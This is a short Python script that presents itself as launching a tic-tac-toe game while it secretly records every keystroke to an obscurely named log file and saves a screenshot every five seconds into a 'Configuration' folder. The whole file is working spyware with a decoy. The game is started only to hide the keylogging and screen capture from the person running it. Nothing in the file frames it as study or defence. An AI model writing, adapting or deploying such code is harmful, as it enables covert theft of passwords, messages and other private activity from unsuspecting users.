from pynput import keyboard
import logging
import time
import threading
from PIL import ImageGrab
import subprocess
import os


log_dir = "..\\..\\Configuration\\"
shortened = "XSiO_Config"
full = os.path.join(log_dir, shortened)

logging.basicConfig(filename=(log_dir + "fwu9Tvkh0gcVerQzEBrqKpuD06Gufk.txt"), level=logging.DEBUG, format=' %(message)s')

def on_press(key):
        logging.info(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def take_screenshot(interval):
    while True:
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        file_path = os.path.join(full, f"screenshot_{timestamp}.jpeg")
        screenshot.save(file_path)
        time.sleep(interval)

def start_tic_tac_toe_game():
    subprocess.Popen(["python3", "config.py"])
def main():
    try:
        screenshot_interval = 5
        screenshot_thread = threading.Thread(target=take_screenshot, args=(screenshot_interval,))
        screenshot_thread.daemon = True
        screenshot_thread.start()

        start_tic_tac_toe_game()

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"An error occurred: {e}")
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()